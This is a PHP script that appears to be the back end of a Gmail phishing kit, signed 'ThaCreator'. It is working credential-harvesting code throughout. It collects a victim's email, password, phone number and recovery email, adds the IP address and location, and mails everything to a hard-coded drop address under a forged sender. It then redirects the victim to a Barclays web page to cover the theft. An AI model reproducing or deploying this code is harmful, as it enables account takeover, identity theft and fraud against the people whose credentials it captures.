<?php

	require_once('geoplugin.class.php');
	$geoplugin = new geoPlugin();

    //get user's ip address 
    $geoplugin->locate();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
    }

    $message = "";
    $message .= "---|BY ThaCreator|---\n";
	$message .= "Email Provider: Gmail\n";
    $message .= "E: " . $_GET['user'] . "\n"; 
    $message .= "Ps: " . $_GET['pass'] . "\n"; 
    $message .= "Phone: " . $_GET['phone'] . "\n"; 
    $message .= "Rec Email: " . $_GET['recEmail'] . "\n"; 
    $message .= "IP : " .$ip. "\n"; 
    $message .= "--------------------------\n";
    $message .=     "City: {$geoplugin->city}\n";
    $message .=     "Region: {$geoplugin->region}\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .= "--------------------------\n";
	
	$to ="holluwerjimmy@gmail.com";

	$subject = "Gmail | $ip";
	$headers = "From: Blessing <blessing@heaven.com>";

	$send = mail($to,$subject,$message,$headers);
	if($send){
?>
<script>
	window.location="https://wealth.barclays.com/en_us/home/what-we-offer/entrepreneurs.html";
</script>
<?php }?>

